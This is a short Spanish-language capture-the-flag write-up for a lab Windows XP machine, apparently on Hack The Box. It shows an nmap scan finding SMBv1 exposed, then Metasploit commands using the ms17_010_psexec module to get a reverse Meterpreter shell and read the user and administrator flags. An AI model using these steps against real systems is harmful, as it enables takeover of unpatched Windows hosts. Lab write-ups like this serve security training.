Maquina: Windows
Level: Easy
IP: 10.10.10.4

## Herramientas a utilizar:

- nmap
- metaexploit

### Fase 1 Enumeracion 

```
# nmap -A -o scan_legacy.txt 10.10.10.4
```
Esto no traera lo siguiente puerto
|PORT|STATE| SERVICE|VERSION|
|----|----|----|----|
|139/tcp|  open|   netbios-ssn|   Microsoft Windows netbios-ssn
|445/tcp|  open|  microsoft-ds|  Windows XP microsoft-ds
|3389/tcp| closed| ms-wbt-server|

La parte muy importante a destacar en esta maquina es que mas abajo no dice que la version de SMB que este equipo tiene es smb1 la cual es vulnerable a **eternablue.**

### Fase 2 Explotacion
Aqui utilizaremos MetaExploit
```
msfconsole
msf6> use exploit/windows/smb/ms17_010_psexec
set rhost 10.10.10.4
set lhost 10.10.14.x (la ip que nos asigna la vpn_htb).
run
```

Con esto ya tenemos **meterpreter>** desde aqui solo es enumerar.
```
cd c:\Documents and Settings\john\Desktop
```
Flag del user `type user.txt`
```
cd C:\Documents and Settings\Administrator\Desktop\
```
Flag del root `type root.txt`
